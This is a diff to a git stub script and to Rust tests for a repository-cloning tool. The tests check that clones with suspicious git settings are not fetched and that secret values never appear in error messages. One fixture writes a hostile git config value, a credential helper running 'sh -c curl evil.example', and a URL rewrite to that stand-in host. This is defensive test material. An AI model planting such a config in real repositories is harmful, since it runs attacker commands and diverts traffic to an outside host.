@@ -18,7 +18,11 @@ if [ "$1" = -C ]; then
   [ "$1" = --no-optional-locks ] && shift
   case "$1" in
     remote) cat "$dir/.fake-origin" 2>/dev/null || exit 2 ;;
-    config) cat "$dir/.fake-config" 2>/dev/null ;;
+    config)
+      case "$*" in
+        *--name-only*) sed 's/=.*//' "$dir/.fake-config" 2>/dev/null | tr '\n' '\0' ;;
+        *--get-all*) sed -n "s/^$4=//p" "$dir/.fake-config" 2>/dev/null ;;
+      esac ;;
     fetch) [ -f "$dir/.fake-fetch-fails" ] && { echo "fatal: unable to access: Could not resolve host" >&2; exit 128; }; echo fetched >> "$dir/.fetched" ;;
   esac
   exit 0
@@ -260,9 +264,62 @@ async fn a_clone_with_a_credential_helper_or_an_insteadof_rule_is_not_fetched_an
     std::fs::write(path.join(".fake-config"), "core.filemode=true\ncredential.helper=!sh -c 'curl evil.example'\nurl.https://evil.example/.insteadof=https://github.com/\n").unwrap();
     let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
     let Some(Fetched::Not(why)) = ensured.fetched else { panic!("{ensured:?}") };
-    assert!(why.contains("credential.helper") && why.contains("url.https://evil.example/.insteadof"), "{why}");
-    assert!(!why.contains("curl"), "values are never repeated: {why}");
+    assert!(why.contains("credential.helper") && why.contains("url.*.insteadof"), "{why}");
+    assert!(!why.contains("curl") && !why.contains("evil.example"), "values and URLs are never repeated: {why}");
     assert!(!path.join(".fetched").exists());
+}
+
+#[tokio::test]
+async fn a_token_inside_a_url_in_a_setting_name_is_never_repeated() {
+    let rig = Rig::new("token-key");
+    let path = agents_root(&rig.home).join("acme/webshop");
+    std::fs::create_dir_all(path.join(".git")).unwrap();
+    std::fs::write(path.join(".fake-origin"), "https://github.com/acme/webshop.git").unwrap();
+    std::fs::write(path.join(".fake-config"), "url.https://x-access-token:ghp_TOKEN@github.com/.insteadof=https://github.com/\nhttp.https://ghp_TOKEN@github.com/.extraheader=x\n").unwrap();
+    let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
+    let Some(Fetched::Not(why)) = ensured.fetched else { panic!("{ensured:?}") };
+    assert!(why.contains("url.*.insteadof") && why.contains("http.*.extraheader") && !why.contains("ghp_TOKEN"), "{why}");
+}
+
+#[tokio::test]
+async fn a_clone_whose_fetch_rule_was_changed_is_not_fetched_and_a_normal_fetch_names_its_refspec() {
+    let rig = Rig::new("fetch-rule");
+    let path = agents_root(&rig.home).join("acme/webshop");
+    std::fs::create_dir_all(path.join(".git")).unwrap();
+    std::fs::write(path.join(".fake-origin"), "https://github.com/acme/webshop.git").unwrap();
+    std::fs::write(path.join(".fake-config"), "remote.origin.url=https://github.com/acme/webshop.git\nremote.origin.fetch=+refs/heads/gone/*:refs/heads/worktree-*\n").unwrap();
+    let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
+    assert!(matches!(ensured.fetched, Some(Fetched::Not(ref why)) if why.contains("fetch rules were changed")), "{ensured:?}");
+    assert!(!path.join(".fetched").exists());
+
+    std::fs::write(path.join(".fake-config"), "remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*\n").unwrap();
+    assert_eq!(ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap().fetched, Some(Fetched::Done));
+    assert!(rig.log().contains("fetch --prune --quiet origin +refs/heads/*:refs/remotes/origin/*"), "{}", rig.log());
+}
+
+#[test]
+fn an_owner_folder_that_exists_in_another_case_gives_the_path_the_disk_keeps() {
+    let rig = Rig::new("owner-case");
+    std::fs::create_dir_all(agents_root(&rig.home).join("Shopify/liquid")).unwrap();
+    let path = work_path(&rig.home, "Shopify/Polaris").unwrap();
+    assert_eq!(path, real(&path), "{path:?} is as the disk keeps it");
+    assert!(path.ends_with("polaris") && path.parent().unwrap().file_name().unwrap().eq_ignore_ascii_case("shopify"), "{path:?}");
+    std::fs::create_dir_all(&path).unwrap();
+    assert_eq!(work_path(&rig.home, "shopify/polaris").unwrap(), path.canonicalize().unwrap());
+}
+
+#[tokio::test]
+async fn a_temporary_folder_older_than_the_clone_limit_is_removed_and_a_newer_one_is_not() {
+    let rig = Rig::new("stale-temps");
+    let path = agents_root(&rig.home).join("acme/webshop");
+    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+    let stale = path.with_file_name(".webshop.cloning-0123456789ab");
+    let fresh = path.with_file_name(".webshop.cloning-ba9876543210");
+    std::fs::create_dir_all(&stale).unwrap();
+    std::fs::create_dir_all(&fresh).unwrap();
+    std::fs::File::open(&stale).unwrap().set_modified(std::time::SystemTime::now() - CLONE_LIMIT - Duration::from_secs(60)).unwrap();
+    remove_stale_temps(&rig.home, "acme/webshop");
+    assert!(!stale.exists() && fresh.exists(), "only a leftover older than the clone limit is removed");
 }
 
 #[tokio::test]
